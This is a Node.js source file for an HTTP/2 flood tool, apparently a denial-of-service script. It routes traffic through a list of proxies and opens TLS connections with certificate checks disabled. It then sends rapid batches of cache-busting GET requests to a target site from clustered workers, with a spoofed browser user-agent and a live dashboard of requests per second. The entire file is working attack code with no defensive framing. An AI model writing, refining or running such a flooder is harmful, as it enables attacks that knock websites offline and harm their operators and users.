const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const url = require("url");
const os = require("os");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/).filter(l => l.length > 5);

const ALL_ALPN = ['h2', 'http/1.1'];

if (cluster.isMaster) {
    const numCPUs = os.cpus().length;
    const optimalThreads = Math.min(args.threads, numCPUs);
    
    let totalSent = 0, rps = 0;
    const codes = {}, proxyHits = {};

    for (let i = 0; i < optimalThreads; i++) cluster.fork();

    setInterval(() => {
        console.clear();
        console.log(`\x1b[36mTLS-HTTPS : @gringomdz\x1b[0m`);
        console.log(`\x1b[33mTarget : ${parsedTarget.host} | Port : 443\x1b[0m`);
        console.log(`\x1b[90m──────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[32mSENT TOTAL : ${totalSent.toLocaleString()} | RPS : ${rps.toLocaleString()}\x1b[0m`);
        
        let st = Object.entries(codes).sort((a,b) => b[1]-a[1]).map(([c,v]) => `${c}: ${v}`).join(' | ');
        console.log(`\x1b[33mSTATUS CODES : ${st || 'PUSHING...'}\x1b[0m`);
        console.log(`\x1b[90m──────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[37mTOP 5 PROXIES PERFORMANCE:\x1b[0m`);
        Object.entries(proxyHits).sort((a,b) => b[1]-a[1]).slice(0, 5).forEach(([ip, count]) => {
            console.log(`> ${ip.padEnd(20)} - Hits: ${count.toString()}`);
        });
        rps = 0;
    }, 1000);

    cluster.on('message', (worker, msg) => {
        if (msg.type === 'batch') {
            totalSent += msg.c; 
            rps += msg.c;
            if (msg.ip) proxyHits[msg.ip] = (proxyHits[msg.ip] || 0) + msg.c;
            if (msg.codes) for (let c in msg.codes) codes[c] = (codes[c] || 0) + msg.codes[c];
        }
    });
    
    setTimeout(() => process.exit(1), args.time * 1000);
} else {
    const workerId = cluster.worker.id;
    let activeConns = 0;
    const maxConns = 30;
    
    function runFlooder() {
        if (activeConns >= maxConns) {
            setTimeout(runFlooder, 100);
            return;
        }
        
        const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
        if (!proxyAddr) return;
        const parsedProxy = proxyAddr.split(":");
        
        activeConns++;
        
        const socket = net.connect({ host: parsedProxy[0], port: ~~parsedProxy[1] });
        socket.setNoDelay(true);
        socket.setTimeout(10000);
        
        let isDead = false;
        
        socket.once("connect", () => {
            socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
        });

        socket.once("data", (d) => {
            if (!d.toString().includes("200")) {
                cleanup();
                return;
            }

            const tlsConn = tls.connect({
                socket: socket,
                servername: parsedTarget.host,
                ALPNProtocols: ALL_ALPN,
                rejectUnauthorized: false,
                ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!eNULL",
                minVersion: "TLSv1.2",
                maxVersion: "TLSv1.3"
            });
            
            tlsConn.setKeepAlive(true, 30000);
            
            tlsConn.once("secureConnect", () => {
                const client = http2.connect(parsedTarget.href, {
                    protocol: "https:",
                    createConnection: () => tlsConn,
                    settings: { maxConcurrentStreams: 500, initialWindowSize: 6291456 }
                });

                let bCount = 0;
                let bCodes = {};
                let reqInterval;
                
                client.on("connect", () => {
                    function sendBatch() {
                        if (client.destroyed || client.closed) return;
                        
                        for (let i = 0; i < args.Rate; i++) {
                            const req = client.request({
                                ":method": "GET",
                                ":path": parsedTarget.path + "?" + crypto.randomBytes(4).toString('hex'),
                                ":scheme": "https",
                                ":authority": parsedTarget.host,
                                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
                                "accept": "*/*",
                                "accept-language": "pt-BR,pt;q=0.9",
                                "cache-control": "no-cache"
                            });

                            req.on("response", (res) => {
                                const sc = res[":status"];
                                bCodes[sc] = (bCodes[sc] || 0) + 1;
                                bCount++;
                                if (bCount >= 50) {
                                    process.send({ type: 'batch', c: bCount, codes: bCodes, ip: parsedProxy[0] });
                                    bCount = 0;
                                    bCodes = {};
                                }
                                req.close();
                                req.destroy();
                            });
                            req.end();
                        }
                    }
                    
                    sendBatch();
                    reqInterval = setInterval(sendBatch, 100);
                });
                
                client.on("error", () => cleanup());
                client.on("close", () => cleanup());
                
                function cleanup() {
                    if (isDead) return;
                    isDead = true;
                    if (reqInterval) clearInterval(reqInterval);
                    if (bCount > 0) {
                        process.send({ type: 'batch', c: bCount, codes: bCodes, ip: parsedProxy[0] });
                    }
                    client.destroy();
                    tlsConn.destroy();
                    socket.destroy();
                    activeConns--;
                }
            });
            
            tlsConn.on("error", () => cleanup());
        });
        
        socket.on("error", () => cleanup());
        socket.on("timeout", () => cleanup());
        
        function cleanup() {
            if (isDead) return;
            isDead = true;
            activeConns--;
            if (!socket.destroyed) socket.destroy();
        }
    }
    
    // Múltiplas instâncias por worker para aumentar RPS
    const instances = Math.min(8, Math.floor(100 / args.threads));
    for (let i = 0; i < instances; i++) {
        setInterval(runFlooder, 1);
    }
    
    setTimeout(() => process.exit(1), args.time * 1000);
}
